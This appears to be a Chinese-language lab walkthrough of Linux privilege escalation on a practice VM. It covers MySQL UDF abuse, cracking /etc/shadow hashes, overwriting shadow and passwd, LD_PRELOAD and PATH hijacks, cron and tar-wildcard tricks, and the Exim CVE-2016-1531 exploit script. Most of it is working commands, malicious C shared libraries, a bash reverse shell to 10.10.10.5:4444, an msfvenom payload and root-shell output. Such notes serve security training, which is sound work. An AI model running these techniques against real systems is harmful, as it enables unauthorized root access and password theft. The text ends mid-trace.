使用 mysql 用户自定义函数提权，udf 是 User-Defined Function（用户自定义函数），可以在 SQL 查询中使用，类似于内置函数。通过使用 UDF 用户可以对数据库执行自定义操作，从而满足特定业务需求。用户自定义函数通常用于处理复杂的数据操作，简化查询，或者实现数据库本身不支持的特定功能。这是 mysql 数据库自带的功能，无需特定设置。

#### 提权条件

1. 掌握 mysql 数据库的账户：该账户对 mysql 用于 `create`、`insert`、`delete` 等权限，以创建和使用函数（最好是 root 账户）。
2. secure_filr_priv 为空：使用命令 `show variables like '%secure_file_priv%'` 查看，`secure_file_priv` 是 mysql 系统变量，用于限制 `LOAD DATA`、`SELECT ... INTO OUTFILE`、`LOAD_FILE()` 等文件操作范围，它可以限制这些操作仅在特定目录下进行以增强系统的安全性。当 `secure_file_priv` 设置为一个非空目录路径时，这些操作仅允许在指定目录下进行。

#### 准备利用条件

```shell
gcc -g -c raptor_udf2.c -fPIC
```

- -g：生成调试信息
- -c：指示编译器仅编译源码，但不进行链接
- -fPIC：告诉编译器生成位置无关代码（Position-Independent Code，PIC），这种代码可以在内存中的任意位置执行

```shell
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

- -shared：生成一个共享库文件而非可执行文件
- -Wl：将后面的选项传递给链接器
- -soname,raptor_udf2.so：设置生成的共享库的 "soname"
- -lc：链接器链接标准 C 库

#### 利用过程

```mysql
use mysql;
create table foo(line blob);
insert into foo values(load_file('home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

- create table foo(line blob)：创建一个名为 "foo" 的表（table），包含名为 "line" 的列（column），数据类型为 BLOB。BLOB 表示 "Binary Large Object"，可以储存大量二进制数据。
- foo 在计算机编程和网络中是一个常用占位符的名称。
- create function do_system returns integer soname 'raptor_udf2.so'：寻找 plugin 目录中的 .so 文件。
- 如果 dumpfile 失败，对于 AppArmor 编辑 `/etc/apparmor.d/usr.sbin.mysqld `文件，找到以下行：` /usr/sbin/mysqld { `，在此行下方添 加以下内容： `/usr/lib/mysql/plugin/** rw`。
- 删除 mysql 函数命令：`DROP FUNCTION IF EXISTS dosystem;`。
- 查询已有 udf：`SELECT * FROM mysql.func;`。

执行：

```mysql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

```bash
/tmp/rootbash -p
```

### 可读 shadow 文件提权

#### 利用过程

查看 `/etc/shadow` 文件发现可读。

```bash
user@RedteamNotes:~$ ls -liah /etc/shadow
1241132 -rw-r--rw- 1 root shadow 842 Apr 25  2023 /etc/shadow
```

读取 `/etc/shadow` 文件。

```bash
user@RedteamNotes:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
messagebus:*:19472:0:99999:7:::
```

将加密的密码复制到 kali，使用 john 破解密码。

```bash
# 靶机
user@RedteamNotes:~$ cat /etc/shadow | grep ':\$'
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
```

```bash
#kali
──(kali㉿kali)-[~/Work/Kali]
└─$ cat >> passwd.txt << EOF
heredoc> root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
heredoc> EOF
                                                                                                       
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat passwd.txt          
root:/euwmK.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
user:/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ vim hash
                                                                                                       
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat hash 
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
                                                                                                       
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)     
password321      (user)     
2g 0:00:00:07 DONE (2026-01-14 05:55) 0.2735g/s 8474p/s 8685c/s 8685C/s simone13..kelly17
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

尝试登入。

![](Pasted%20image%2020260114185635.png)

### 可写 shadow 文件利用

查看 `/etc/shadow` 文件发现可写。

```bash
user@RedteamNotes:~$ ls -liah /etc/shadow
1241132 -rw-r--rw- 1 root shadow 842 Apr 25  2023 /etc/shadow
```

备份 shadow 文件。

```bash
user@RedteamNotes:~$ cp /etc/shadow /tmp/shadow.bak
user@RedteamNotes:~$ ls /tmp
backup.tar.gz  shadow.bak  useless
```

制作要替换的 sha-512 密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ mkpasswd -m sha-512 enilmalus
$6$1jXHC49QenfimFS4$ncBkl6H.3JA9N2ZoTHCpu4g68lTPlX0RFYiFEkHA8I3.AgWcKiL0mtrUiC5Ue87TP8eIEWDe/Dij4hP5gb/Gm0
```

修改 `/etc/shadow` 的 `root` 密码凭据。

```bash
user@RedteamNotes:~$ vim /etc/shadow
user@RedteamNotes:~$ cat /etc/shadow | grep 'root'
root:$6$1jXHC49QenfimFS4$ncBkl6H.3JA9N2ZoTHCpu4g68lTPlX0RFYiFEkHA8I3.AgWcKiL0mtrUiC5Ue87TP8eIEWDe/Dij4hP5gb/Gm0:17298:0:99999:7:::
```

尝试登入。

![](Pasted%20image%2020260114190632.png)

### 可写 passwd 文件利用

查看 `/etc/passwd` 文件发现可写。

```bash
1241288 -rw-r--rw- 1 root root 998 Apr 25  2023 /etc/passwd
```

备份 `/etc/passwd` 文件。

```bash
user@RedteamNotes:~$ cp /etc/passwd /tmp/passwd.bak
user@RedteamNotes:~$ ls -liah /tmp/passwd.bak
1158728 -rw-r--r-- 1 user user 998 Jan 14 06:10 /tmp/passwd.bak
```

制作并替换 root 密码。

```bash
user@RedteamNotes:~$ openssl passwd enilmalus
Warning: truncating password to 8 characters
8KZAn18Dg1XO6
user@RedteamNotes:~$ vim /etc/passwd
user@RedteamNotes:~$ cat /etc/passwd | grep 'root'
root:8KZAn18Dg1XO6:0:0:root:/root:/bin/bash
```

尝试登入。

![](Pasted%20image%2020260114191253.png)

### sudo 环境变量提权

枚举 sudo 权限，发现有 `LD_PRELOAD` 选项。

```bash
user@RedteamNotes:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
```

`LD_PRELOAD` 允许任何程序使用共享库的功能。如果启用了 `env_keep` 选项，我们可以生成一个共享库，该共享库在允许程序之前加载和执行。

1. 检查 `LD_PRELOAD` （带有 env_keep 选项）
2. 编写一个简单的 C 代码作为共享对象（.so 扩展名）文件编译
3. 使用 sudo 权限指向我们的 .so 文件的 `LD_PRELOAD` 选项运行程序

制作 root shell。

```bash
user@RedteamNotes:/tmp/env_privTEST$ vim shell.c
user@RedteamNotes:/tmp/env_privTEST$ cat shell.c 
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}
```

编译文件。

```bash
user@RedteamNotes:/tmp/env_privTEST$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
user@RedteamNotes:/tmp/env_privTEST$ ls
shell.c  shell.so
```

现在我们使用 sudo 运行任何程序时都可以使用此共享文件，通过指定 `LD_PRELOAD` 运行程序。

```bash
user@RedteamNotes:/tmp/env_privTEST$ pwd
/tmp/env_privTEST
user@RedteamNotes:/tmp/env_privTEST$ ls
shell.c  shell.so
user@RedteamNotes:/tmp/env_privTEST$ sudo LD_PRELOAD=/tmp/env_privTEST/shell.so find
root@RedteamNotes:/tmp/env_privTEST# whoami
root
```

解释一下：

- LD：Linker Dynamic，即动态链接器，是操作系统中的一个组件，负责在程序运行时链接共享库到程序中。
- PRELOAD：预加载，意味着在程序运行前动态链接库先加载有 LD_PRELOAD 环境变量指定的共享库。

### 自动任务文件提权

枚举自动任务。

```bash
user@RedteamNotes:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

可以发现每分钟以 root 权限运行 overwrite.sh 与 /usr/local/bin/compress.sh，查找阅读一下 overwrite.sh 的内容。

```bash
user@RedteamNotes:~$ locate overwrite.sh
/usr/local/bin/overwrite.sh
user@RedteamNotes:~$ ls -liah /usr/local/bin/overwrite.sh
816761 -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
user@RedteamNotes:~$ cat /usr/local/bin/overwrite.sh
#!/bin/bash

echo `date` > /tmp/useless
```

发现可以修改 overwrite.sh 的内容，进行修改。

```bash
user@RedteamNotes:~$ vim /usr/local/bin/overwrite.sh
user@RedteamNotes:~$ cat /usr/local/bin/overwrite.sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
```

在 kali 上监听 4444 端口，等待自动任务运行得到回显。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.5] from (UNKNOWN) [10.10.10.12] 34407
bash: no job control in this shell
root@RedteamNotes:~# whoami
whoami
root
```

### 自动任务 PATH 环境变量提权

查看自动任务，发现 crontab 的 PATH 包含了 user 的家目录。

```bash
user@RedteamNotes:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

在家目录下创建一个 overwrite.sh。

```bash
user@RedteamNotes:~$ vim overwrite.sh
user@RedteamNotes:~$ cat overwrite.sh 
#!/bin/bash

cp /bin/bash /tmp/rootBash2
chmod +xs /tmp/rootBash2
user@RedteamNotes:~$ chmod +xs overwrite.sh 
user@RedteamNotes:~$ ls -liah
total 52K
155042 drwxr-xr-x 4 user user 4.0K Jan 15 10:04 .
155041 drwxr-xr-x 3 root root 4.0K May 15  2017 ..
155046 -rw------- 1 user user 2.3K Apr 28  2023 .bash_history
155045 -rw-r--r-- 1 user user  220 May 12  2017 .bash_logout
155043 -rw-r--r-- 1 user user 3.2K May 14  2017 .bashrc
375363 drwxr-xr-x 2 user user 4.0K May 13  2017 .irssi
156485 -rw------- 1 user user  137 May 15  2017 .lesshst
155047 -rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
155048 -rw------- 1 user user   11 May 15  2017 .nano_history
155072 -rwsr-sr-x 1 user user   66 Jan 15 10:04 overwrite.sh
155044 -rw-r--r-- 1 user user  725 May 13  2017 .profile
155049 drwxr-xr-x 8 user user 4.0K May 15  2017 tools
155073 -rw------- 1 user user 3.8K Jan 15 10:04 .viminfo
```

等待自动任务执行获得 root。

```bash
user@RedteamNotes:~$ ls /tmp
backup.tar.gz  rootBash2
user@RedteamNotes:~$ /tmp/rootBash2 -p
rootBash2-4.1# whoami
root
```

### 自动任务通配符提权

查看自动任务发现每分钟自动以 `root` 身份运行脚本 `/usr/local/bin/compress.sh`，查看该脚本。

```bash
user@RedteamNotes:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

user@RedteamNotes:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

解释一下这个命令

```bash
tar czf /tmp/backup.tar.gz *
```

- c：创建新的归档文件
- z：通过 gzip 进行压缩生成 .tar.gz 格式的压缩文件，若不使用则会创建未压缩的 .tar 归档文件
- f：指定归档文件的名称为 /tmp/backup.tar.gz
- \*：所有内容

每分钟以 `root` 的身份将 user 家目录下的所有文件打包为 `/tmp/backup.tar.gz`。

在 kali 中制作反弹 shell。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell.elf

```

上传至靶机。

![](Pasted%20image%2020260115231901.png)

给反弹 shell 赋权并利用 touch 使用反弹 shell。

```bash
user@RedteamNotes:~$ chmod +xs shell.elf 
user@RedteamNotes:~$ ls -liah shell.elf 
155063 -rwsr-sr-x 1 user user 194 Jan 15 10:18 shell.elf
user@RedteamNotes:~$ touch /home/user/--checkpoint=1
user@RedteamNotes:~$ touch /home/user/--checkpoint-action=exec=shell.elf
```

kali 开启监听等待反弹 shell 运行。

### SUID 可执行文件利用提权

查看具有 s 位的可执行文件。

```bash
user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/tmp/rootBash2
/sbin/mount.nfs
/home/user/overwrite.sh
/home/user/shell.elf
```

发现 exim 很可疑，可能可以用于提权，使用 searchsploit 搜索一下。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ searchsploit exim 4.84
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Exim - 'perl_startup' Local Privilege Escalation (Metasploit)         | linux/local/39702.rb
Exim 4.84-3 - Local Privilege Escalation                              | linux/local/39535.sh
Exim < 4.86.2 - Local Privilege Escalation                            | linux/local/39549.txt
Exim < 4.90.1 - 'base64d' Remote Code Execution                       | linux/remote/44571.py
PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution              | php/webapps/42221.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

有一个版本匹配的本地提权漏洞利用脚本，下载下来看看能不能利用。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ searchsploit -m 39535 
  Exploit: Exim 4.84-3 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/39535
     Path: /usr/share/exploitdb/exploits/linux/local/39535.sh
    Codes: CVE-2016-1531
 Verified: True
File Type: POSIX shell script, ASCII text executable
Copied to: /home/kali/Work/Kali/39535.sh


                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls
39535.sh  shell.elf
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat 39535.sh 
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps.
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
#
# -- Hacker Fantastic
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

下载利用脚本至靶机，赋予权限。

![](Pasted%20image%2020260115234353.png)

利用获得 root。

![](Pasted%20image%2020260115234547.png)

### SUID 共享库注入提权

查看具有 s 位的可执行文件。

```bash
user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/tmp/rootBash2
/sbin/mount.nfs
/home/user/overwrite.sh
/home/user/shell.elf
```

尝试运行分析 /usr/local/bin/suid-so 。

```bash
user@RedteamNotes:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
user@RedteamNotes:~$ strings /usr/local/bin/suid-so
/lib64/ld-linux-x86-64.so.2
#eGVO
CyIk
libdl.so.2
__gmon_start__
_Jv_RegisterClasses
dlopen
libstdc++.so.6
_ZNSt8ios_base4InitD1Ev
_ZNSolsEPFRSoS_E
__gxx_personality_v0
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
_ZSt4cout
_ZNSo5flushEv
_ZNSt8ios_base4InitC1Ev
_ZNSolsEi
libm.so.6
libgcc_s.so.1
libc.so.6
__cxa_atexit
__libc_start_main
GLIBC_2.2.5
CXXABI_1.3
GLIBCXX_3.4
fff.
fffff.
l$ L
t$(L
|$0H
Calculating something, please wait...
/home/user/.config/libcalc.so
Done.
Y@-C
```

发现可能链接 /home/user/.config/libcalc.so，使用 strace 进行进一步的分析。

```bash
user@RedteamNotes:~$ strace /usr/local/bin/suid-so 2>&1 | grep 'home'
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

发现尝试打开 /home/user/.config/libcalc.so 的时候未寻找到该文件或目录，我们创建一个让他打开。

```bash
user@RedteamNotes:~$ pwd
/home/user
user@RedteamNotes:~$ mkdir .config
user@RedteamNotes:~$ cd .config/
user@RedteamNotes:~/.config$ vim libcalc.c
user@RedteamNotes:~/.config$ cat libcalc.c 
#include <stdio.h>
#include <stdlib.h>

static void injetc() __attribute__((constructor));

void injetc() {
        setuid(0);
        system("/bin/bash -p");
}
user@RedteamNotes:~/.config$ gcc -shared -fPIC -o libcalc.so libcalc.c
gcc: libcalc.c: No such file or directory
gcc: no input files
user@RedteamNotes:~/.config$ mv libcalc.so libcalc.c
user@RedteamNotes:~/.config$ gcc -shared -fPIC -o libcalc.so libcalc.c
user@RedteamNotes:~/.config$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# whoami
root
```

解释一下这个 c 程序。

```c
#include <stdio.h>
#include <stdlib.h>

static void injetc() __attribute__((constructor));

void injetc() {
        setuid(0);
        system("/bin/bash -p");
}
```

- static void injetc() __attribute__((constructor));：声明一个名为 inject 的静态函数，并使用 gcc 的 __attribute__((constructor)) 属性。这个属性使得在程序或动态库加载时自动执行 inject 函数，而不需要显式调用它。

### SUID 环境变量提权

查看具有 s 位的可执行文件。

```bash
user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/tmp/rootBash2
/sbin/mount.nfs
/home/user/overwrite.sh
/home/user/shell.elf
```

`/usr/local/bin/suid-env` 可能可以利用提权，查看详细信息。

```bash
user@RedteamNotes:~$ file /usr/local/bin/suid-env
/usr/local/bin/suid-env: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
user@RedteamNotes:~$ /usr/local/bin/suid-env
Starting web server: apache2httpd (pid 1603) already running
.
user@RedteamNotes:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

发现程序使用 `service` 启动 `apache2` 服务，使用的是相对路径而非绝对路径，在本地创建一个 `service`，让程序执行我们的 `service` 达成提权。

```bash
user@RedteamNotes:~$ vim service.c 
user@RedteamNotes:~$ cat service.c 
#include <stdio.h>
#include <stdlib.h>

void main() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
}
user@RedteamNotes:~$ gcc -o service service.c 
user@RedteamNotes:~$ export PATH=.:$PATH
user@RedteamNotes:~$ echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
user@RedteamNotes:~$ /usr/local/bin/suid-env
root@RedteamNotes:~# whoami
root
```

### 巧用 SUID-shell 功能提权

查看具有 s 位的可执行文件。

```bash
user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/tmp/rootBash2
/sbin/mount.nfs
/home/user/overwrite.sh
/home/user/shell.elf
```

发现 `/usr/local/bin/suid-env2` 可能可以作为提权的路径，运行查看详细信息。

```bash
user@RedteamNotes:~$ /usr/local/bin/suid-env2
Starting web server: apache2httpd (pid 1603) already running
.
user@RedteamNotes:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```

程序使用 `/usr/sbin/service` 启动 `apache2` 服务，查看 `bash` 版本。

```bash
user@RedteamNotes:~$ /bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

`bash` 的版本为 4.1.5，当 `bash`的版本小于 4.2-048 时，在 `Bash shell` 中定义并导出一个名为 `/usr/sbin/service` 的函数。这个函数的定义为运行一个新的 `Bash shell` 进程，并在该进程中启用特权模式，然后这个函数通过 `export -f` 命令导出，这使得它可以在当前 `Bash shell` 会话的子进程中被访问执行。

- `export -f` 将整个函数导入而非一个变量

```bash
user@RedteamNotes:~$ function /usr/sbin/service { /bin/bash -p; }
user@RedteamNotes:~$ export -f /usr/sbin/service 
user@RedteamNotes:~$ /usr/local/bin/suid-env2
root@RedteamNotes:~# whoami
root
```

### 巧用 SUID-shell 功能提权 2

查看具有 s 位的可执行文件与 `bash` 版本。`bash` 版本小于 4。

```bash
user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/tmp/rootBash2
/sbin/mount.nfs
/home/user/overwrite.sh
/home/user/shell.elf
user@RedteamNotes:~$ /bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

同样使用 `/usr/local/bin/suid-env2` 进行提权。

```bash
user@RedteamNotes:~$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash2;chmod +xs /tmp/rootbash2)' /usr/local/bin/suid-env2
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
